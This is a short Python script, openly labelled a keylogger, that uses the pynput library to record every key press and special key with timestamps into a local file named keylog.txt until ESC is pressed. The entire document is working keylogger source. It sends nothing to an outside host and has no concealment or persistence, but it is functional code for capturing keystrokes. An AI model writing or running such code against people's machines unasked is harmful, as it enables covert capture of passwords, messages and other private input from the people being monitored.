#!/usr/bin/env python3

from pynput import keyboard
import logging

# Set up logging to write captured keys to a local file
log_file = "keylog.txt"  # File to store keystrokes
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define function to handle key press events
def on_press(key):
    try:
        # Log regular keys
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        # Log special keys like Shift, Ctrl, etc.
        logging.info(f'Special key pressed: {key}')

# Define function to handle key release events (optional, but useful)
def on_release(key):
    if key == keyboard.Key.esc:  # Stop the listener on pressing ESC
        logging.info('Exiting keylogger...')
        return False

# Set up the listener for the keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    logging.info("Keylogger started...")
    listener.join()
